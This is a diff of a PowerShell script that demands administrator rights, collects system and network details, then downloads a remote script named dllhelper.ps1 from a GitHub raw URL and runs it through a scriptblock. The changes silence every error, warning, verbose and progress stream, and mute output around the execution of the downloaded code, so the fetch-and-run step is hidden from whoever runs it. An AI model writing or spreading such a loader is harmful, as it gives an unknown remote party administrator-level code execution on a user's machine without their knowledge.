@@ -1,10 +1,10 @@
 #Requires -RunAsAdministrator
 
-$ErrorActionPreference = "Continue"
-$WarningPreference = "Continue"
-$InformationPreference = "Continue"
-$VerbosePreference = "Continue"
-$ProgressPreference = "Continue"
+$ErrorActionPreference = "SilentlyContinue"
+$WarningPreference = "SilentlyContinue"
+$InformationPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
 $systemInfo = Get-WmiObject -Class Win32_ComputerSystem
 $osInfo = Get-WmiObject -Class Win32_OperatingSystem
@@ -23,7 +23,11 @@ foreach ($adapter in $networkAdapters) {
 
 $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"
 $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing
+
+$oldVerbose = $VerbosePreference
+$VerbosePreference = "SilentlyContinue"
 $sb = [scriptblock]::Create($script)
 & $sb
+$VerbosePreference = $oldVerbose
 
 Write-Output "This may take a while"
